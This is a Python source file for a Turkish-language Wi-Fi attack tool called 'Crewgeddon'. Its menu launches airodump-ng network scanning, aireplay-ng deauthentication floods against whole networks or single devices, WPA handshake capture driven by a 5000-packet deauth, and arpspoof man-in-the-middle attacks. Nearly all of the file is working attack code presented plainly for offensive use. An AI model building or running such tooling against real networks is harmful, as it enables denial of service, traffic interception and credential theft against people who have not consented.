from colorama import Fore
import time
import subprocess
import os

def wifiHack(interface):
    print(f"{Fore.WHITE}Interface: {Fore.BLUE}{interface} {Fore.WHITE}Monitör Mod: {Fore.BLUE}Monitör Mod Açık")
    print(f"{Fore.YELLOW}[Duyuru]: {Fore.WHITE}Ağ Tarama Sırasında Wifiler Gözükmez ise Monitor modu kapatıp açınız.")
    print(Fore.GREEN + "[0]" + Fore.BLUE + " - Ana Menü")
    print(Fore.GREEN + "[1]" + Fore.BLUE + " - Ağları İzleyin")
    print(Fore.GREEN + "[2]" + Fore.BLUE + " - Ağ Özel İzleme")
    print(Fore.GREEN + "[3]" + Fore.BLUE + " - Ağ Saldırı")
    print(Fore.GREEN + "[4]" + Fore.BLUE + " - Cihaza Özel Saldırı")
    print(Fore.GREEN + "[5]" + Fore.BLUE + " - Hanshake Yakalama")
    print(Fore.GREEN + "[6]" + Fore.BLUE + " - Ortadaki Adam Saldırısı")
    secim_wifi = int(input("CREWGEDDON~#: "))
    if secim_wifi == 0:
        return secim_wifi
    elif secim_wifi == 1:
        print(f"{Fore.YELLOW}[CREWGEDDON]: {Fore.WHITE}Taramayı durdurmak için CTRL + C tuşlarına basın.")
        subprocess.Popen([
            "xterm",
            "-T", "Crewgeddon - Ağ Taraması",
            "-hold",
            "-e", f"airodump-ng {interface}"
        ])
    elif secim_wifi == 2:
        bss_id = input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}BSSID: ")
        channel_id = int(input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}CHANNEL: "))
        subprocess.Popen(["xterm", "-T", "Crewgeddon - Özel Ağ İzleyicisi", "-hold", "-e",
                          f"airodump-ng --channel {channel_id} --bssid {bss_id} {interface}"])
    elif secim_wifi == 3:
        adet = int(input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}Saldırı Adeti (50-1000): "))
        if adet < 50 or adet > 1000:
            print(f"{Fore.RED}[CREWGEDDON]: {Fore.WHITE}Lütfen 50 ila 1000 arasında bir rakam belirtin.")
        else:
            bssid = input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}BSSID: ")
            print(f"{Fore.GREEN}[CREWGEDDON]: {Fore.WHITE}Saldırı Başlatıldı.")
            print(f"{Fore.YELLOW}[CREWGEDDON]: {Fore.WHITE}Durdurmak için (CTRL + C) tuşlarını kullanın.")
            subprocess.Popen(["xterm", "-T", "Crewgeddon - Ağ Saldırısı", "-hold", "-e",
                              f"aireplay-ng --deauth {adet} -a {bssid} {interface}"])
    elif secim_wifi == 4:
        adet = int(input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}Saldırı Adeti (50-1000): "))
        if adet < 50 or adet > 1000:
            print(f"{Fore.RED}[CREWGEDDON]: {Fore.WHITE}Lütfen 50 ila 1000 arasında bir rakam belirtin.")
        else:
            bssid = input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}BSSID: ")
            tbssid = input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}BSSID (Saldırılacak Cihaz): ")
            print(f"{Fore.GREEN}[CREWGEDDON]: {Fore.WHITE}Saldırı Başlatıldı.")
            print(f"{Fore.YELLOW}[CREWGEDDON]: {Fore.WHITE}Durdurmak için (CTRL + C) tuşlarını kullanın.")
            subprocess.Popen(["xterm", "-T", "Crewgeddon - Özel Ağ Saldırısı", "-hold", "-e",
                              f"aireplay-ng --deauth {adet} -a {bssid} -c {tbssid} {interface}"])
    elif secim_wifi == 5:
        print(f"{Fore.YELLOW}[CREWGEDDON]: {Fore.WHITE}Durdurmak için (CTRL + C) tuşlarını kullanın.")
        subprocess.Popen(["xterm", "-T", "Crewgeddon - Hedef Bulucu", "-hold", "-e", f"airodump-ng {interface}"])
        bss_id = input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}BSSID: ")
        channel_id = int(input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}CHANNEL: "))
        subprocess.Popen(["xterm", "-T", "Crewgeddon - Özel Ağ İzleyicisi", "-hold", "-e",
                          f"airodump-ng --channel {channel_id} --bssid {bss_id} --write crewgeddon_handshake {interface}"])
        subprocess.Popen(["xterm", "-T", "Crewgeddon - Ağ Saldırısı", "-hold", "-e",
                          f"aireplay-ng --deauth 5000 -a {bss_id} {interface}"])
        print(f"{Fore.GREEN}[CREWGEDDON]: {Fore.WHITE}.cap Dosyası /crewgeddon/crewgeddon_handshake.cap Yoluna kayıt edilecek.")
        
    elif secim_wifi == 6:
        tip = input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}Hedef IP: ")
        ip = input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}IP: ")
        ethType = int(input(f"{Fore.LIGHTMAGENTA_EX}[1] - {Fore.LIGHTRED_EX}eth0\n{Fore.LIGHTMAGENTA_EX}[2] - {Fore.LIGHTRED_EX}{interface}\n{Fore.WHITE}Seçim: "))
        
        interfaceSelect = "eth0"
        if ethType == 1:
            interfaceSelect = "eth0"
        elif ethType == 2:
            interfaceSelect = interface
        else:
            print(f"{Fore.RED}[CREWGEDDON]: {Fore.WHITE}Geçersiz model belirttiniz.")
        
        print(f"{Fore.GREEN}[CREWGEDDON]: {Fore.WHITE}Saldırı başlatılıyor. Lütfen bekleyin.. (3sn)")
        time.sleep(3)
        subprocess.Popen(["xterm", "-T", "Crewgeddon - Ortadaki Adam Saldırısı", "-hold", "-e", f"arpspoof -i {interfaceSelect} -t {tip} -r {ip}"])
        
    else:
        print(Fore.RED + "[CREWGEDDON]:" + Fore.WHITE + " Geçersiz işlem belirttiniz.")
        time.sleep(2)
        return secim_wifi
    